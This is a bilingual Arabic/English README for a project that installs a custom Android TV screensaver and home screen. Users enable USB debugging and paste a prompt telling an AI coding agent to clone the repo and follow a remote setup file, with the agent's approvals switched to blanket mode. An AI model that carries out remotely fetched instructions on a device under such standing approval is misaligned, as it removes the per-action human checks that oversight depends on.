## ركّبه في 3 خطوات ### ① التلفزيون الإعدادات ← حول ← اضغط OK على **Build** سبع مرات. بعدها روح إلى **خيارات المطوّر** ← شغّل **USB debugging**. ### ② كمبيوتر على نفس الواي فاي، وعليه واحد من هذي | **Codex** (OpenAI) | **Claude Code** (Anthropic) | |---|---| | مجاني بحساب ChatGPT | يحتاج اشتراك Claude Pro (20$ بالشهر) | | حمّل تطبيق Codex | حمّل تطبيق Claude ← تبويب **Code** | | الموافقات: اختر **«Approve for me»** | الموافقات: **Allow** للمهمة كلها | ويندوز: ركّب Git وPython أول (`winget install --source winget Git.Git Python.Python.3.12`). Gemini CLI مجاني وناس قالوا يشتغل؛ ما جرّبناه. > **ما عندك كمبيوتر؟** تقدر تجهّز التلفزيون من **التلفزيون نفسه** (حمّل التطبيقين بتطبيق Downloader وافتح «إعداد تلفزيوني»)، أو من **جوال أندرويد** (Termux) أو **آيفون/آيباد** (iSH). التفاصيل: [`docs/PHONE-SETUP.md`](docs/PHONE-SETUP.md). ### ③ الصق هذا > ركّب تلفزيوني من https://github.com/tshi-dev/UrTV: انسخ المستودع واتبع `docs/SETUP-PROMPT.md` خطوة بخطوة. أنت على كمبيوتر متصل بنفس شبكة الواي فاي حقت التلفزيون. #### وش يصير بعد اللصق؟ يسألك عن **مدينتك** و**أنديتك**، والتلفزيون يسألك **Allow** مرة وحدة، وبعدها خلّه يشتغل: 40 دقيقة وكم إعادة تشغيل. #### بترجعه مثل ما كان؟ نعم، بأي وقت: تطبيقاتنا تنحذف، واللي أطفأناه يرجع، وشاشة التلفزيون الأصلية ترجع. `optimize/reset.sh` #### نزلت نسخة جديدة؟ حدّث التطبيقين وإعداداتك كلها باقية. الشاشة نفسها تتحدّث لحالها. آخر الإعدادات، تحت «تحديث صفحة شاشة التوقف»، ثلاثة أسطر: الإصدار الحالي، والإصدار المتاح، وطريقة التحديث. `optimize/install.sh all` #### نزل تحديث للنظام وقفل تطبيقنا؟ أعد الإعداد كله بأمر واحد، وإعداداتك باقية. `optimize/run.sh again`
## Set it up in 3 steps ### ① The TV Settings → About → press OK on **Build** 7 times. Then go to **Developer options** → turn on **USB debugging**. ### ② A computer on the same Wi-Fi, with one of these | **Codex** (OpenAI) | **Claude Code** (Anthropic) | |---|---| | Free with a ChatGPT account | Needs Claude Pro ($20/month) | | Download the Codex app | Download the Claude app → **Code** tab | | Approvals: choose **«Approve for me»** | Approvals: **Allow** for the whole task | Windows: install Git and Python first (`winget install --source winget Git.Git Python.Python.3.12`). Gemini CLI is free and reported to work; not tested by us. > **No computer?** Set the TV up from **the TV itself** (install the two apps with the Downloader app and open «إعداد تلفزيوني»), from an **Android phone** (Termux) or from an **iPhone/iPad** (iSH). Details: [`docs/PHONE-SETUP.md`](docs/PHONE-SETUP.md). ### ③ Paste this > Set up my TV with https://github.com/tshi-dev/UrTV: clone it and follow `docs/SETUP-PROMPT.md` step by step. You are on a computer on the same Wi-Fi as the TV. #### What happens after pasting? It asks your **city** and your **clubs**, the TV asks **Allow** once, then leave it: 40 minutes, a few restarts. #### Can I put it back as it was? Yes, anytime: our apps are removed, what we turned off comes back on, the TV's own screen returns. `optimize/reset.sh` #### A new version came out? Update both apps; all your settings stay. The screen itself updates on its own. The settings row tells you when one exists. `optimize/install.sh all` #### The TV updated its system and locked our app out? Redo the whole setup with one command, settings kept. `optimize/run.sh again` **Safe:** nothing is uninstalled; AirPlay, Chromecast and voice are never touched; a 5-minute safety switch puts the stock home back if ours doesn't come up. The apps are built and signed by GitHub Actions from this repo (version 4.0, build N: `VERSION` names it, the build number is the Actions run). The full prompt: [docs/SETUP-PROMPT.md](docs/SETUP-PROMPT.md). To build a different screen: [docs/RECREATE-PROMPT.md](docs/RECREATE-PROMPT.md). ## What you get | | | | |---|---|---| | **شاشة تلفزيونك** · screensaver | Clock, Hijri date, prayer times and iqama, Ramadan, your teams' matches, weather, markets, and beside the clock your choice of new episodes, today's prayers, the 5-day forecast, all your teams' games, a stock watchlist, or a verse/hadith of the day, over Saudi landscapes | `urtv-screensaver.apk` | |
